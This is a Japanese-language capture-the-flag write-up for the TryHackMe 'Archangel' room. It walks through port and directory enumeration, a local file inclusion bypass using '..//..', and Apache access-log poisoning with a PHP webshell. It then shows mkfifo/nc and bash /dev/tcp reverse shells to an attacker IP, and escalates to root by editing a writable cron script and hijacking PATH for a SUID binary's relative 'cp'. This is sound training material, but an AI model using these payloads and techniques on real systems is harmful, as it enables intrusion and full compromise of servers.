# Archangle CTF

https://tryhackme.com/room/archangel

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.137.5
root@ip-10-10-95-130:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 04:57 GMT
Nmap scan report for 10.10.137.5
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:5D:7F:62:34:FD (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds
root@ip-10-10-95-130:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 04:58 GMT
Nmap scan report for 10.10.137.5
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:5D:7F:62:34:FD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

### gobuster

```shell
root@ip-10-10-95-130:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.5
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.137.5/images/]
/pages                (Status: 301) [Size: 310] [--> http://10.10.137.5/pages/]
/.php                 (Status: 403) [Size: 276]
/flags                (Status: 301) [Size: 310] [--> http://10.10.137.5/flags/]
/layout               (Status: 301) [Size: 311] [--> http://10.10.137.5/layout/]
/licence.txt          (Status: 200) [Size: 5014]
/server-status        (Status: 403) [Size: 276]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/flags/flag.html

Youtubeのビデオに飛ばされる。CTFでよく見るミュージックビデオ。  
https://www.youtube.com/watch?v=dQw4w9WgXcQ


/pages

```shell
root@ip-10-10-95-130:~# gobuster dir -x=txt,php -u http://$TARGET/pages -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.5/pages
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

```shell
root@ip-10-10-95-130:~# gobuster dir -x=html -u http://$TARGET/pages -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.5/pages
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/gallery.html         (Status: 200) [Size: 13209]
/index.html           (Status: 200) [Size: 0]
Progress: 436550 / 436552 (100.00%)
===============================================================
Finished
===============================================================
```

mafialize.thm を hosts に追加してアクセスするとフラグ１が表示された。

http://mafialive.thm/robots.txt

```text
User-agent: *
Disallow: /test.php
```

## test.php

ボタンを押すと、下記のパラメータでGETしている。  
/test.php?view=/var/www/html/development_testing/mrrobot.php

ページの下に「Control is an illusion」と表示されるので、おそらくPHPのincludeが実行されているのではないか？

試した感じ、/var/www/html/development_testing のホワイトリストフィルターが入っていると思われる。

test.php のコードを取得したい。

```text
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=file:///var/www/html/development_testing/test.php
```

```text
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
```

デコード
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{.............}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

view パラメータに

- ../.. が含まれている
- /var/www/html/development_testing' が含まれていない

場合に拒絶されることが分かった。

```text
http://mafialive.thm/test.php?view=data://text/plain,<?php phpinfo(); echo '/var/www/html/development_testing'; ?>

http://mafialive.thm/test.php?cmd=whoami&view=data://text/plain,<?php system($_GET['cmd']); echo '/var/www/html/development_testing'; ?>

http://mafialive.thm/test.php?view=php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php phpinfo(); echo '/var/www/html/development_testing'; ?>

http://mafialive.thm/test.php?cmd=whoami&view=php://filter/string.strip_tags/resource=data://text/plain,<?php system($_GET['cmd']); echo '/var/www/html/development_testing'; ?>
```

空白が返る。dataディレクティブは無効にされていると思われる。

httpを指定したが、HTTPリクエストは来なかった。dataが無効なら当然。

```text
http://mafialive.thm/test.php?view=http://10.2.22.182:8000/shell.php?a=/var/www/html/development_testing
```

後は、ログポイズニングが考えられるが、そもそも、../.. を使えない状況で「/var/log/apache2/access.log」等を参照可能か？

→ ..//.. を使うことでフィルター回避が可能。

実証  
http://mafialive.thm/test.php?0=whoami&view=/var/www/html/development_testing/..//..//..//..//etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

アクセスログに残すため、  
```text
http://mafialive.thm/test.php?view=<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/8888 0>&1'") ?>  
```
に対してGETリクエスト。その後、
```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log  
```
をGETリクエストした。

```text
 [08/Mar/2025:17:16:02 +0530] "GET /test.php?view=%3C?php%20exec(%22/bin/bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/10.2.22.182/8888%200%3E&1%27%22)%20?%3E HTTP/1.1" 200 489 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" 
 ```
ログ上、エンコードされていてPHPとして実行されなかった。

エンコードされないよう、Burpプロキシで書き換えたら何もログが表示されなくなってしまった。  
逆に、ログポイズニングが機能する兆候とも言える。

```http
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

いったん環境を Terminate して、ncを使う。

```shell
$ nc 10.10.76.26 80
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/8888 0>&1'") ?>
HTTP/1.1 400 Bad Request
Date: Sun, 09 Mar 2025 01:01:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

またログが表示されない状態。error.logからエラーを見てみる。

```text
PHP Parse error: syntax error, unexpected '"/bin/bash -c 'bash -i >& /dev' (T_CONSTANT_ENCAPSED_STRING), expecting identifier (T_STRING) in /var/log/apache2/access.log on line 19
```

クォートを使わない形を使う。

```shell
$ nc 10.10.128.39 80  
<?=`$_GET[0]`?>
HTTP/1.1 400 Bad Request
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f
```
このリバースシェルをURLエンコードして、0パラメータにする。  
http://mafialive.thm/test.php?0=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%38%38%38%38%20%3e%2f%74%6d%70%2f%66&view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log

取れた！

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.128.39] 34240
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```shell
$ cd /home/archangel
$ ls -al
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
$ cat user.txt
thm{lf1.............}
```

ユーザーフラグゲット。

## 権限昇格１

secretディレクトリを見るために、archangelへの昇格を目指す。

所有ファイル
```shell
$ find / -user archangel -type f 2>/dev/null
/opt/helloworld.sh
/home/archangel/.selected_editor
/home/archangel/.profile
/home/archangel/user.txt
/home/archangel/.bash_logout
/home/archangel/.bashrc
```

```shell
$ ls -al /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
$ cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```

```shell
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

/opt/helloworld.sh が毎分実行されており、自由に書き込み可能。  
/home/archangel/secret ディレクトリ を読めるようにする。

```shell
$ echo "\nchmod -R 777 /home/archangel/secret\n" >> /opt/helloworld.sh
$ cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt

chmod -R 777 /home/archangel/secret
```

読めるようになった。

```shell
$ ls -al secret
total 32
drwxrwxrwx 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
```

backup は rootユーザーのSUID付き。

```shell
$ cat secret/user2.txt
thm{h0..........................}
```

フラグ2ゲット。

## 権限昇格２

### sectet/backup

```shell
$ file secret/backup
secret/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped

$ secret/backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```

```shell
$ ls -al myfiles
total 12
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 .
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 ..
-rw-r--r-- 1 root      root        44 Nov 18  2020 passwordbackup
$ cat myfiles/passwordbackup
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

あのビデオのURL。これをパスワードにしても、archangleでもrootでもログインできなかった。

backupが何をしているかわからないので解析する。

```shell
$ strings secret/backup
......
cp /home/user/archangel/myfiles/* /opt/backupfiles
......
```

/home/user/archangel/myfiles  
/opt/backupfiles  
にもパーミッションを付ける。

```shell
echo "\nchmod -R 777 /home/user/archangel/myfiles\n" >> /opt/helloworld.sh
echo "\nchmod -R 777 /opt/backupfiles\n" >> /opt/helloworld.sh
```

```shell
$ $ ls -al /opt/backupfiles
total 16
drwxrwxrwx 2 archangel archangel 4096 Nov 20  2020 .
drwxrwxrwx 3 root      root      4096 Nov 20  2020 ..
-rwxrwxrwx 1 archangel archangel  540 Mar  9 07:33 helloworld.txt
-rwxrwxrwx 1 archangel archangel   44 Nov 18  2020 passwordbackup
```

整理すると、/home/archangel/secret/backup は、
- rootオーナーのSUID付き（r-x権限）
- myfiles/* を /opt/backupfiles にコピー

```shell
cp /home/user/archangel/myfiles/* /opt/backupfiles
```
このワイルドカードを悪用できるのではないか？

```shell
cp /home/user/archangel/myfiles/1 /home/user/archangel/myfiles/../../../../root/root.txt /opt/backupfiles
```

このような形になることを目指す。  
言い換えると、"1 /home/user/archangel/myfiles/../../../../root/root.txt" という名前のファイルを作る。

ファイルを作ろうとしてようやく気づいたが、/home/user/archangel/myfiles は user が入っているので不正なパス。

/home に user ディレクトリを作ることは不可能なので困った。

念のため他の機能がないか ghidra で調べたが、何もなかった。

```shell
undefined8 main(void)
{
  setuid(0);
  setgid(0);
  system("cp /home/user/archangel/myfiles/* /opt/backupfiles");
  return 0;
}
```

非常に長い回り道をした後、cp自体が相対パスであることに気づく。

```shell
$ pwd
/home/archangel/secret

$ cat cp
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8890 >/tmp/f

$ export PATH=/home/archangel/secret:$PATH
$ ./backup
```

```shell
$ nc -nvlp 8890
listening on [any] 8890 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.128.39] 54378
sh: 0: can't access tty; job control turned off
# whoami
root
# ls /root
root.txt
# cat /root/root.txt
thm{p4....................}
```

ルートフラグゲット！

## 振り返り

- hostsに追加してドメイン名でアクセスしたら違う結果になることもある。今後は、ドメインが分かっている場合はhostsに追加する。
- ログポイズニングは、いきなり複雑なコードを仕込むとエラーが発生し何もできなくなる。汎用性の高い最小限のコードを仕込み、複雑なコードはログ参照時のパラメータとして与える方がよい。
- /opt/helloworld.sh を編集できるなら最初からリバースシェルを取る方がスマートだった。
- /home/user/ の部分に気を取られて、cp が相対パスであることにずっと気づかなかったのが悔やまれる。

## Tags

#tags:LFI
